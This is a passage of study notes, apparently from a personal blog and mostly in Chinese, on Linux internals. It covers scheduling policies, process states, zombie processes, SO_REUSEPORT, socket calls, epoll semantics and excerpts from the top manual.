real-time via sched_setscheduler system call </li><li>First-in, first-out: SCHED_FIFO: Static priority, Process is only preempted for a higher-priority process, No time quanta; it runs until it blocks or yields voluntarily, RR within same priority level</li><li>Round-robin: SCHED_RR: As above but with a time quanta</li><li>Normal processes have SCHED_NORMAL scheduling policy</li></ul></blockquote><h4 id="Multiprocessor-scheduling"><a href="#Multiprocessor-scheduling" class="headerlink" title="Multiprocessor scheduling"></a>Multiprocessor scheduling</h4><blockquote><ul><li>Per-CPU runqueue</li><li>Possible for one processor to be idle while others have jobs waiting in their run queues</li><li>Periodically, rebalance runqueues</li><li>Migration threads move processes from one runque to another</li><li>The kernel always locks runqueues in the same order for deadlock prevention</li></ul></blockquote><h4 id="Adjusting-priority"><a href="#Adjusting-priority" class="headerlink" title="Adjusting priority"></a>Adjusting priority</h4><blockquote><ul><li>Goal: dynamically increase priority of interactive process</li><li>How to determine interactive? Sleep ratio, Mostly sleeping: I/O bound, Mostly running: CPU bound</li></ul></blockquote><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><ul><li>Scheduling policies(Ref: <a href="https://www.kernel.org/doc/Documentation/scheduler/sched-design-CFS.txt" target="_blank" rel="noopener">Scheduling policies</a>)<blockquote><ol start="5"><li>Scheduling policies</li></ol><p>CFS implements three scheduling policies:</p><ul><li><p>SCHED_NORMAL (traditionally called SCHED_OTHER): The scheduling<br>policy that is used for regular tasks.</p></li><li><p>SCHED_BATCH: Does not preempt nearly as often as regular tasks<br>would, thereby allowing tasks to run longer and make better use of<br>caches but at the cost of interactivity. This is well suited for<br>batch jobs.</p></li><li><p>SCHED_IDLE: This is even weaker than nice 19, but its not a true<br>idle timer scheduler in order to avoid to get into priority<br>inversion problems which would deadlock the machine.</p></li></ul><p>SCHED_FIFO/_RR are implemented in sched/rt.c and are as specified by<br>POSIX.</p></blockquote></li><li><p>SCHEDULING CLASSES</p><blockquote><p>The new CFS scheduler has been designed in such a way to introduce “Scheduling<br>Classes,” an extensible hierarchy of scheduler modules.  These modules<br>encapsulate scheduling policy details and are handled by the scheduler core<br>without the core code assuming too much about them.</p><p>sched/fair.c implements the CFS scheduler described above.</p><p>sched/rt.c implements SCHED_FIFO and SCHED_RR semantics, in a simpler way than<br>the previous vanilla scheduler did.  It uses 100 runqueues (for all 100 RT<br>priority levels, instead of 140 in the previous scheduler) and it needs no<br>expired array.</p><p>Scheduling classes are implemented through the sched_class structure, which<br>contains hooks to functions that must be called whenever an interesting event<br>occurs.</p></blockquote></li><li><p>Linux有两种不同的优先级范围</p><ul><li>nice值：从-20到19，越大优先级越低。所有unix系统的标准化概念，但是不同unix系统的调度算法不同，所以nice值的运用方式也不同。<code>ps -el</code>中<code>NI</code>那一列就是进程对应的nice值</li><li>实时优先级：从0到99，越大优先级越高。任何实时进程的优先级都高于普通进程，也就是实时优先级跟nice值是两个不相交的范畴。<code>ps -eo stat,uid,pid,ppid,rtprio,time,comm</code>中，<code>rtprio</code>就是实时优先级，如果是<code>-</code>则说明不是实时进程</li></ul></li><li>nice value（来自sched和nice的的manual）<blockquote><ul><li><strong>It affects the scheduling of SCHED_OTHER and SCHED_BATCH (see below) processes.</strong> </li><li>The nice value can be modified using nice(2), setpriority(2), or sched_setattr(2). </li><li><strong>According to POSIX.1, the nice value is a per-process attribute</strong>; that is, the threads in a process should share a nice value. However, <strong>on Linux, the nice value is a per-thread attribute</strong>: different threads in the same process may have different nice values. </li><li>The range of the nice value varies across UNIX systems. <strong>On modern Linux, the range is -20 (high priority) to +19 (low priority)</strong>. On some other systems, the range is -20..20. Very early Linux kernels (Before Linux 2.0) had the range -infinity..15. </li><li>The degree to which the nice value affects the relative scheduling of SCHED_OTHER processes likewise varies across UNIX systems and across Linux kernel versions. </li><li>With the advent of the <strong>CFS scheduler</strong> in kernel 2.6.23, Linux adopted an algorithm that <strong>causes relative differences in nice values to have a much stronger effect</strong>. </li><li><strong>In the current implementation, each unit of difference in the nice values of two processes results in a factor of 1.25 in the degree to which the scheduler favors the higher priority process.</strong> This causes very low nice values (+19) to truly provide little CPU to a process whenever there is any other higher priority load on the system, and makes high nice values (-20) deliver most of the CPU to applications that require it (e.g., some audio applications). </li><li>On Linux, the RLIMIT_NICE resource limit can be used to define a limit to which an unprivileged process’s nice value can be raised; see setrlimit(2) for details. </li><li>Traditionally, only a privileged process could lower the nice value (i.e., set a higher priority). However, since Linux 2.6.12, an unprivileged process can decrease the nice value of a target process that has a suitable RLIMIT_NICE soft limit; see getrlimit(2) for details.</li></ul></blockquote></li></ul><h3 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h3><ul><li>来自<em>linux内核设计与实现</em></li><li><code>TASK_RUNNING</code>：进程是可执行的，可能正在执行，或在运行队列中等待执行。这是进程在用户空间中执行的唯一可能状态。内核空间中正在执行的进程也是这种状态</li><li><code>TASK_INTERRUPTIBLE</code>：进程正在睡眠（也就是被阻塞），到达某些条件达成，一旦条件达成，内核就会把进程状态设置为RUNNING。处于此状态的进程会因为接收到信号而提前被唤醒并随时准备投入运行</li><li><code>TASK_UNINTERRUPTIBLE</code>：与<code>TASK_INTERRUPTIBLE</code>的差别在于，就算接受到信号也不会被唤醒或准备投入运行。通常在进程必须在等待时不受干扰或等待的事件很快就会发生时出现（比如这个任务正在进行重要的操作，甚至可能持有一个信号量）。因为不对信号做响应，所以较之可中断的状态，用的较少。（ps中看到的<code>D</code>状态的进程就是这种状态）</li><li><code>__TASK_TRACED</code>：被其他进程跟踪的进程，比如通过ptrace对调试程序进行跟踪</li><li><code>__TASK_STOPPED</code>：进程停止执行，没有投入运行也不能投入运行。发生在接受到<code>SIGSTOP</code>，<code>SIGTSTP</code>，<code>SIGTTIN</code>，<code>SIGTTOU</code>信号时，调试期间受到任何信号也会使得进程进入这状态</li><li>转换图见书P24(41)</li><li>Ref: ps manual <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">the state of a process:</span><br><span class="line">        D    uninterruptible sleep (usually IO)</span><br><span class="line">        I    Idle kernel thread</span><br><span class="line">        R    running or runnable (on run queue)</span><br><span class="line">        S    interruptible sleep (waiting for an event to complete)</span><br><span class="line">        T    stopped by job control signal</span><br><span class="line">        t    stopped by debugger during the tracing</span><br><span class="line">        W    paging (not valid since the 2.6.xx kernel)</span><br><span class="line">        X    dead (should never be seen)</span><br><span class="line">        Z    defunct (&quot;zombie&quot;) process, terminated but not reaped by its parent</span><br></pre></td></tr></table></figure></li></ul><h3 id="僵尸进程、孤儿进程"><a href="#僵尸进程、孤儿进程" class="headerlink" title="僵尸进程、孤儿进程"></a>僵尸进程、孤儿进程</h3><ul><li>子进程的父进程终止后，成为孤儿进程，init（pid为1，所有进程的祖先）会接管孤儿进程，所以判断父进程是否终止的方法可以是检查getppid是否返回<code>1</code>（前提是这个子进程原本的父进程不是init）</li><li>系统允许父进程在子进程终止后还去执行<code>wait</code>，以确定子进程是如何终止的。这是通过把子进程转为僵尸进程来处理的，僵尸进程释放了该该进程持有的大部分资源，唯一保留的是内核中的进程表中的一条记录（包含pid、终止状态、资源使用数据等）。僵尸进程无法被<code>SIGKILL</code>杀死（SIGKILL、SIGSTOP信号无法被捕获和忽略）</li><li>父进程调用<code>wait</code>之后，内核将删除僵尸进程，如果父进程没有执行<code>wait</code>就退出，init将接管子进程并自动调用<code>wait</code></li><li>如果父进程没有退出，而又没有<code>wait</code>子进程，那么就可能导致僵尸进程填满内核进程表，从而阻碍新进程的创建。将他们移除的唯一方法是：杀死父进程（或是等待父进程终止）从而init会<code>wait</code></li><li>父进程<code>wait</code>的方式<ul><li>父进程不带<code>WNOHANG</code>标志调用<code>wait</code></li><li>父进程带有<code>WNOHANG</code>标志轮询</li><li>为SIGCHILD建立handler（默认是忽略）。需要在handler内部带<code>WNOHANG</code>不断调用<code>wait</code>以避免两个问题：调用信号Handler时，会阻塞引发该handler的信号；同一个信号不排队</li><li>应该在创建任何子进程之前就设置好Handler，因为在设置Handler时，如果已有子进程终止，那么有的系统会立刻产生SIGCHILD信号，有的不会</li></ul></li></ul><h3 id="进程内存布局"><a href="#进程内存布局" class="headerlink" title="进程内存布局"></a>进程内存布局</h3><ul><li>共享库的虚拟地址是随着运行确定的，使用<code>pmap</code>拿地址布局可以看到，两次运行，共享库的地址布局不一样</li><li><code>ldd</code>显示的lib地址也是随着ldd的不同调用而改变的<blockquote><p>Be  aware that in some circumstances (e.g., where the program specifies an ELF interpreter other than ld-linux.so), some versions of ldd may attempt to obtain the dependency information by attempting to directly execute the program, which may lead to the execution of whatever code is  defined  in the  program’s ELF interpreter, and perhaps to execution of the program itself</p></blockquote></li></ul><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><ul><li>识别僵尸进程<code>ps -ef | grep &quot;defunct&quot;</code></li></ul><h3 id="SO-REUSEPORT"><a href="#SO-REUSEPORT" class="headerlink" title="SO_REUSEPORT"></a><code>SO_REUSEPORT</code></h3><blockquote><p><a href="https://lwn.net/Articles/542629/" target="_blank" rel="noopener">引用自</a></p><ul><li>The new socket option allows multiple sockets on the same host to bind to the same port, and is intended to improve the performance of multithreaded network server applications running on top of multicore systems.</li><li>So long as the first server sets this option before binding its socket, then any number of other servers can also bind to the same port if they also set the option beforehand</li><li>The requirement that the first server must specify this option prevents port hijacking—the possibility that a rogue application binds to a port already used by an existing server in order to capture (some of) its incoming connections or datagrams.</li><li>To prevent unwanted processes from hijacking a port that has already been bound by a server using SO_REUSEPORT, all of the servers that later bind to that port must have an effective user ID that matches the effective user ID used to perform the first bind on the socket. </li><li>The second of the traditional approaches used by multithreaded servers operating on a single port is to have all of the threads (or processes) perform an accept() call on a single listening socket in a simple event loop of the form:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">&gt;        new_fd = accept(...);</span><br><span class="line">&gt;        process_connection(new_fd);</span><br><span class="line">&gt;    &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><p>  The problem with this technique, as Tom pointed out, is that when multiple threads are waiting in the accept() call, wake-ups are not fair, so that, under high load, incoming connections may be distributed across threads in a very unbalanced fashion</p><ul><li>the SO_REUSEPORT implementation distributes connections evenly across all of the threads (or processes) that are blocked in accept() on the same port.</li><li>SO_REUSEPORT can be used with both TCP and UDP sockets.</li><li>Tom noted that the traditional SO_REUSEADDR socket option already allows multiple UDP sockets to be bound to, and accept datagrams on, the same UDP port. However, by contrast with SO_REUSEPORT, SO_REUSEADDR does not prevent port hijacking and does not distribute datagrams evenly across the receiving threads.</li></ul></blockquote><h3 id="PTHREAD-STACK-MIN"><a href="#PTHREAD-STACK-MIN" class="headerlink" title="PTHREAD_STACK_MIN"></a><code>PTHREAD_STACK_MIN</code></h3><blockquote><p>Ref: <a href="https://docs.oracle.com/cd/E19120-01/open.solaris/816-5137/attrib-45427/index.html" target="_blank" rel="noopener">Setting the Stack Size</a></p><ul><li>The size attribute defines the size of the stack (in bytes) that the system allocates. The size should not be less than the system-defined minimum stack size. See About Stacks for more information.</li><li>size contains the number of bytes for the stack that the new thread uses. If size is zero, a default size is used. In most cases, a zero value works best.<br>-PTHREAD_STACK_MIN is <strong>the amount of stack space that is required to start a thread</strong>. This stack space does not take into consideration the threads routine requirements that are needed to execute application code.</li></ul></blockquote><h3 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h3><ul><li>慢速syscall被信号中断时，已经read、write部分数据的syscall的处理：POSIX2001版是规定为成功返回，返回已read、write的字节数</li><li>POSIX.1要求只有中断信号的<code>SA_RESTART</code>标志有效时，才重启。不同厂商的处理方式不同</li><li>所有的IO设备都被模型化为文件，所有的输入输出都可以被当做相应文件的读和写来处理，这种将设备映射成文件的方式，允许Linux内核引用一个简单、低级的应用接口（Unix IO），这使得所有的输入输出都能以一种统一且一致的方式进行</li></ul><h3 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h3><ul><li>因特网的socket地址存放在<code>sockaddr_in</code>的struct中</li><li>connect、bind、accept函数需要接受各种类型的socket地址结构（不仅仅是因特网socket），所以其要求大家都强转成<code>socketaddr</code>给他</li><li>socket函数才能一个socketFD，可以硬编码<code>socket(AF_INET, SOCK_STREAM, 0)</code>，其返回的fd仅仅是部分打开，还不能用于读写</li><li>客户端使用connect函数来完成三次握手</li><li><code>socket()</code>：返回一个socketFd，这是一个主动套接字</li><li><code>bind()</code><ul><li>把一个本地协议地址赋予一个socket，对于ip协议，就是32bit的ipv4地址或128bit的ipv6地址与16bit的tcp或udp端口号的组合</li><li>调用bind时，可以指定一个端口号和（或）一个ip地址，也可以都不指定</li></ul></li><li><code>listen()</code>：把<code>socket()</code>创建的主动套接字转为监听套接字</li><li>在大多数Linux架构上（除了Alpha和IA-64），所有这些socket系统调用实际上被实现成了通过单个系统调用socketcall()进行多路复用的库函数</li><li>socket中的一方调用close之后，当对等应用程序试图从连接的另一端读取数据时将会收到文件结束（<strong>当所有缓冲数据都被读取之后</strong>）</li><li>如果connect()失败并且希望重新进行连接，那么SUSv3规定完成这个任务的可移植的方法是关闭这个socket，创建一个新socket，在该新socket上重新进行连接</li><li>如果多个文件描述符引用了同一个socket，那么当所有描述符被关闭之后（使用<code>close()</code>）连接就会终止</li><li></li></ul><h4 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h4><ul><li><p>epoll支持水平触发和边缘触发</p><ul><li>水平触发：能在FD上以非阻塞的方式执行I/O操作（poll、select提供的也是这个）</li><li><p>边缘触发</p><ul><li><p>自从上一次调用<code>epoll_wait</code>后FD上是否已经有I/O活动（或者是FD被打开，如果之前没有调用的话），语义上类似信号驱动I/O，如果有多个I/O事件发生，epoll会把他们合并成一次单独的通知（信号驱动上可能会产生多个信号）</p></li><li><p>可以减少syscall的次数</p><blockquote><p>在eventloop类型(包括各类fiber/coroutine)的程序中, 处理逻辑和epoll_wait都在一个线程, ET相比LT没有太大的差别. 反而由于LT醒的更频繁, 可能时效性更好些. 在老式的多线程RPC实现中, 消息的读取分割和epoll_wait在同一个线程中运行, 类似上面的原因, ET和LT的区别不大.<br>但在更高并发的RPC实现中, 为了对大消息的反序列化也可以并行, 消息的读取和分割可能运行和epoll_wait不同的线程中, 这时ET是必须的, 否则在读完数据前, epoll_wait会不停地无谓醒来.</p><p><a href="https://www.zhihu.com/question/20502870/answer/142303523" target="_blank" rel="noopener">引用自</a></p></blockquote></li><li><p>程序基本框架如下</p><ul><li>所有待监视的FD都设置为非阻塞</li><li>通过<code>epoll_ctl</code>建立epoll interest list</li><li>使用如下循环处理IO事件<ul><li>用<code>epoll_wait</code>取得ready的FD list</li><li>针对每一个处于ready的FD，不断调用IO syscall，直到返回<code>EAGAIN</code>或<code>EWOULDBLOCK</code></li></ul></li><li>解决饥饿的方法<ul><li>应用程序自己维护一个list，该list存储到目前为止的所有ready FD（如果某个FD返回<code>EAGAIN</code>或<code>EWOULDBLOCK</code>，则移出去）</li><li>每次都调用<code>epoll_wait</code>去监视并添加ready FD到list中。如果list中已经有FD，则这次监视的timeout（应该指的是<code>epoll_wait</code>的timeout参数）应该为0或较小的正数。这样子就不用在<code>epoll_wait</code>上花太多时间，可以进行IO</li><li>对于list上的FD，可以使用round-robin方式去循环处理，而不是每次从<code>epoll_wait</code>返回后都从list头开始处理</li><li>相对之下，使用水平触发时，因为我们只是在ready 的FD上做一些IO而已（不是循环到不能读为止），所以不会有饥饿问题。（英文原文说的是blocking 的FD，译文说的是非阻塞，我觉得也是非阻塞比较合适，因为如果阻塞那么一旦没东西读了，会不会阻塞在那里呢？还是说只要读了一点东西，然后接下来不能读，就立刻可以返回）</li></ul></li></ul></li></ul></li></ul></li><li><p>核心数据结构称为epoll实例，与epoll_fd关联，是内核数据结构的句柄。这些内核数据结构实现了两个目的</p><ul><li>interest list</li><li>ready list（前者的子集）</li></ul></li><li><p><code>epoll_create</code>：创建epoll实例，size参数已废弃。<code>epoll_create1</code>去掉了该参数并且可设置flags，目前只支持<code>EPOLL_CLOEXEC</code></p><blockquote><p>close-on-exec<br>which causes the file descriptor to be  automatically (and atomically) closed when any of the exec-family functions succeed.<br>This is useful to keep from leaking your file descriptors to random programs run by e.g. <code>system()</code>.</p></blockquote></li><li><p><code>epoll_ctl</code></p><ul><li>fd参数（第三个参数）可以是pipe、FIFO、socket、POSIX消息队列、inotify实例、终端、设备、另一个epoll实例的fd（可以用于建立层次关系），不能是普通文件或目录的FD（EPERM）</li><li>In a multithreaded program, it is possible for one thread to use <code>epoll_ctl</code> to add file descriptors to the interest list of an epoll instance that is already being monitored by epoll_wait() in another thread. These changes to the interest list will be taken into account immediately, and the epoll_wait() call will return readiness information about the newly added file descriptors. </li></ul></li><li><p><code>EPOLLONESHOT</code>：在下一次epoll_wait返回该FD后，该FD在兴趣列表中被标记为非激活状态，可以用<code>EPOLL_CTL_MOD</code>重新激活</p></li><li><p><code>max_user_watcher</code>：每个注册到epoll实例上的FD都会占用一小段不能被交换的内核内存空间。这个参数用于定义可以注册到epoll实例上的FD总数。<code>/proc/sys/fs/epoll/max_user_watches</code></p></li><li><p><code>epoll_wait</code></p><ul><li><p>返回后，需要检查<code>EINTR</code>，如果在执行期间被一个信号打断，然后又通过SIGCONT信号恢复，就可能出现这个错误</p></li><li><p><code>EPOLLHUP</code></p><blockquote><p> Note that when reading from a channel such as a pipe or a stream socket, this event merely indicates that the peer  closed  its  end  of  the channel.  Subsequent reads from the channel will return 0 (end of file) <strong>only after all outstanding data in the channel has been consumed.</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span>(evlist[j].events &amp; EPOLLIN) &#123;</span><br><span class="line">&gt;     <span class="comment">// do read</span></span><br><span class="line">&gt; &#125;<span class="keyword">else</span> <span class="keyword">if</span>(evlist[j].events &amp; (EPOLLHUP | EPOLLERR)) &#123;</span><br><span class="line">&gt;     <span class="comment">// close fd </span></span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; <span class="comment">//  After the epoll_wait(), EPOLLIN and EPOLLHUP may both have been set. But we'll only get here, and thus close the file descriptor, if EPOLLIN was not set. This ensures that all outstanding input (possibly more than MAX_BUF bytes) is consumed (by further loop iterations) before the file descriptor is closed.</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote></li><li><p><code>EPOLLHUP</code>和<code>EPOLLERR</code>会出现在FIFO对端关闭或终端挂起时出现</p></li></ul></li><li>epoll的语义<ul><li>创建epoll实例时，内核在内存中创建一个新的i-node并打开<strong>文件描述</strong>（file descriptor：一个打开的文件的上下文信息，内核的数据结构）</li><li>随后在调用进程中为打开的这个文件描述分配一个新的<strong>文件描述符</strong>（这就是用户空间的应用程序操作这个file descriptor的句柄）</li><li>同epoll实例的insterest list相关联的是打开的<strong>文件描述</strong>，而不是<strong>文件描述符</strong>。所以可以使用dup复制该描述符，fork也可以，因为子进程复制了父进程的epoll描述符。复制后的描述符指向相同的<strong>文件描述</strong></li><li>如果一个<strong>文件描述</strong>是epoll insterest list的成员，那么在这个<strong>文件描述</strong>的所有描述符都关闭后，这个<strong>文件描述</strong>会自动从epoll 的interest list中移除</li><li>所以如果某个fd A被复制（复制的那一个叫fd B），然后关闭该fd A，但是epoll_wait还是会在该<strong>文件描述</strong>就绪后返回fd A</li></ul></li><li>epoll vs select vs poll<ul><li>每次调用select、poll，内核必须检查所有在调用中指定的FD。epoll只需要在FD就绪时将其加入ready list，然后<code>epoll_wait</code>去fetch这些FD就行</li><li>调用select、poll时，我们传递一个标记了所有待监视的FD的数据结构给内核，返回时，内核将所有标记为ready的FD的数据结构在传给我们。epoll则使用<code>epoll_ctl</code>在内核空间建立数据结构，之后的<code>epoll_wait</code>不需要传递数据结构，返回的也只是ready的FD</li><li>epoll的性能会随着发生I/O事件的数量而线性变化，所以适用于需要监视大量FD但是大部分处于空闲状态</li></ul></li><li>epoll与信号<ul><li><code>epoll_wait</code>的过程中是会因为SIGINT而返回，errno为EINTR的</li><li>如果使用了信号，应该使用<code>epoll_pwait</code>来避免race condition</li></ul></li><li><blockquote><ul><li>值得一提的时，epoll的效率在某些情况下比select或者poll要低，这个是曾经做过测试的。具体的业务场景就是：几乎所有连接都处于活跃状态，并且有频繁的业务数据发送和接受，这个时候select或者poll的能力要强于epoll。下面贴一张比较久远的测试数据表格，可以看到这个现象。一个用select实现的echo server，传输的数据量是52B一次的小报文。 (<a href="http://zbo.space/2016/05/24/netio/" target="_blank" rel="noopener">Ref</a>)</li><li><p>select</p><p> |连接数量|cpu(%)|一次回射平均延时(μs)|<br> |:-:|:-:|:-:|<br> |100|94.5|1394|<br> |500|95|9507|<br> |1000|95|19852|</p></li><li><p>epoll</p><p> |连接数量|cpu(%)|一次回射平均延时(μs)|<br> |:-:|:-:|:-:|<br> |100|93|1930|<br> |500|93|11120|<br> |1000|95|23857|</p></li><li>(或许是因为使用了中断，所以不如轮询快？另外，select是数组，epoll应该是链表（？）所以cache miss高？不过听说kqueue可以合并中断，还可以把中断改成轮询)</li><li>原理其它答案讲得差不多了，我就补一句，从kernel层面将，事件产生有可能不是由硬件中断触发的，在一定情况下kernel的确会轮询，因为响应硬件中断是一个成本比较高的操作。以网卡为例，当数据量很少的时候，每来一个数据包网卡都回产生一个中断，kernel响应这个中断，从网卡缓冲区中读出数据放进协议栈处理，当满足一定条件时，kernel回调用户代码，这里的“回调”一般情况下是指从一个kernel syscall中返回(在此之前用户代码一直处于block状态)。当数据量很大时，每个包都产生一个中断就划不来了，此时kernel可以启动interrupt coalescing机制，让网卡做中断合并，也就是说来足够多的数据包或者等待一个timeout才会产生一个中断，kernel在响应中断时会把所有数据一起读出来处理，这样可以有效的降低中断次数。当数据量更大时，网卡缓冲区里几乎总是有未处理的数据，此时kernel干脆会禁掉网卡的中断，切换到轮询处理的模式，说白了就是跑一个忙循环不停地读网卡缓冲区里的数据，这样综合开销更低。<br>作者：徐辰<br>链接：<a href="https://www.zhihu.com/question/20122137/answer/54153089" target="_blank" rel="noopener">https://www.zhihu.com/question/20122137/answer/54153089</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</li></ul></blockquote></li></ul><h3 id="惊群"><a href="#惊群" class="headerlink" title="惊群"></a>惊群</h3><ul><li><blockquote><p>很多个进程都block在server socket的accept()，一但有客户端进来，所有进程的accept()都会返回，但是只有一个进程会读到数据，就是惊群。实际上现在的Linux内核实现中不会出现惊群了，只会有一个进程被唤醒（Linux2.6内核）(<a href="https://www.zhihu.com/question/22756773/answer/22516222" target="_blank" rel="noopener">ref</a>)</p></blockquote></li><li><blockquote><p>为了确保只有一个进程（线程）得到资源，需要对资源操作进行加锁保护，加大了系统的开销。目前一些常见的服务器软件有的是通过锁机制解决的，比如 Nginx</p></blockquote></li><li><a href="https://www.zhihu.com/question/22756773/answer/545048210" target="_blank" rel="noopener">什么是惊群，如何有效避免惊群? - 滴滴云的回答 - 知乎</a></li></ul><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="top"><a href="#top" class="headerlink" title="top"></a>top</h4><ul><li><a href="http://ilinuxkernel.com/?p=869" target="_blank" rel="noopener">Ref</a>。影响load average值大小的直接因素是系统中活动的进程数。Linux的系统负载指运行队列的平均长度，也就是等待CPU的平均进程数。活动的进程数可以很直观表明系统负载情况。值越大，表明CPU上正在运行和待运行的进程数越多，也就是负载越大。查看loadAvg的方法：top、uptime、w、cat /proc/loadavg，是一分钟、五分钟、十五分钟</li><li>top的manual <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"> 2b. TASK and CPU States</span><br><span class="line">    This  portion  consists of a minimum of two lines.  In an SMP environ‐</span><br><span class="line">    ment, additional lines can reflect individual CPU state percentages.</span><br><span class="line"></span><br><span class="line">    Line 1 shows total tasks or threads, depending on  the  state  of  the</span><br><span class="line">    Threads-mode toggle.  That total is further classified as:</span><br><span class="line">        running; sleeping; stopped; zombie</span><br><span class="line"></span><br><span class="line">    Line  2  shows  CPU  state percentages based on the interval since the</span><br><span class="line">    last refresh.</span><br><span class="line"></span><br><span class="line">    As a default, percentages for these  individual  categories  are  dis‐</span><br><span class="line">    played.   Where two labels are shown below, those for more recent ker‐</span><br><span class="line">    nel versions are shown first.</span><br><span class="line">        us, user    : time running un-niced user processes</span><br><span class="line">        sy, system  : time running kernel processes</span><br><span class="line">        ni, nice    : time running niced user processes</span><br><span class="line">        id, idle    : time spent in the kernel idle handler</span><br><span class="line">        wa, IO-wait : time waiting for I/O completion</span><br><span class="line">        hi : time spent servicing hardware interrupts</span><br><span class="line">        si : time spent servicing software interrupts</span><br><span class="line">        st : time stolen from this vm by the hypervisor</span><br><span class="line"></span><br><span class="line">    In  the  alternate  cpu  states  display  modes,  beyond   the   first</span><br><span class="line">    tasks/threads  line,  an  abbreviated  summary  is shown consisting of</span><br><span class="line">    these elements（就是按了`t`键之后显示的内容）:</span><br><span class="line">                   a    b     c    d</span><br><span class="line">        %Cpu(s):  75.0/25.0  100[ ...</span><br><span class="line"></span><br><span class="line">    Where: a) is the combined us and ni percentage; b) is the sy  percent‐</span><br><span class="line">    age; c) is the total; and d) is one of two visual graphs of those rep‐</span><br><span class="line">    resentations.  See topic 4b. SUMMARY AREA Commands and the `t&apos; command</span><br><span class="line">    for additional information on that special 4-way toggle.</span><br><span class="line"></span><br><span class="line">2c. MEMORY Usage</span><br><span class="line">    This  portion  consists  of  two  lines  which  may  express values in</span><br><span class="line">    kibibytes (KiB) through exbibytes (EiB) depending on the scaling  fac‐</span><br><span class="line">    tor enforced with the `E&apos; interactive command.</span><br><span class="line"></span><br><span class="line">    As a default, Line 1 reflects physical memory, classified as:</span><br><span class="line">        total, free, used and buff/cache</span><br><span class="line"></span><br><span class="line">    Line 2 reflects mostly virtual memory, classified as:</span><br><span class="line">        total, free, used and avail (which is physical memory)</span><br><span class="line"></span><br><span class="line">    The  avail number on line 2 is an estimation of physical memory avail‐</span><br><span class="line">    able for starting new applications, without swapping.  Unlike the free</span><br><span class="line">    field,  it  attempts to account for readily reclaimable page cache and</span><br><span class="line">    memory slabs.  It is available on kernels 3.14,  emulated  on  kernels</span><br><span class="line">    2.6.27+, otherwise the same as free.</span><br><span class="line"></span><br><span class="line">    In  the  alternate memory display modes, two abbreviated summary lines</span><br><span class="line">    are shown consisting of these elements:</span><br><span class="line">                   a    b          c</span><br><span class="line">        GiB Mem : 18.7/15.738   [ ...</span><br><span class="line">        GiB Swap:  0.0/7.999    [ ...</span><br><span class="line"></span><br><span class="line">    Where: a) is the percentage used; b) is the total available; and c) is</span><br><span class="line">    one of two visual graphs of those representations.</span><br><span class="line"></span><br><span class="line">    In  the  case  of physical memory, the percentage represents the total</span><br><span class="line">    minus the estimated avail noted above.   The  `Mem&apos;  graph  itself  is</span><br><span class="line">    divided  between used and any remaining memory not otherwise accounted</span><br><span class="line">    for by avail.  See topic 4b. SUMMARY AREA Commands and the `m&apos; command</span><br><span class="line">    for additional information on that special 4-way toggle.</span><br><span class="line"></span><br><span class="line">    This table may help in interpreting the scaled values displayed:</span><br><span class="line">        KiB = kibibyte = 1024 bytes</span><br><span class="line">        MiB = mebibyte = 1024 KiB = 1,048,576 bytes</span><br><span class="line">        GiB = gibibyte = 1024 MiB = 1,073,741,824 bytes</span><br><span class="line">        TiB = tebibyte = 1024 GiB = 1,099,511,627,776 bytes</span><br><span class="line">        PiB = pebibyte = 1024 TiB = 1,125,899,906,842,624 bytes</span><br><span class="line">        EiB 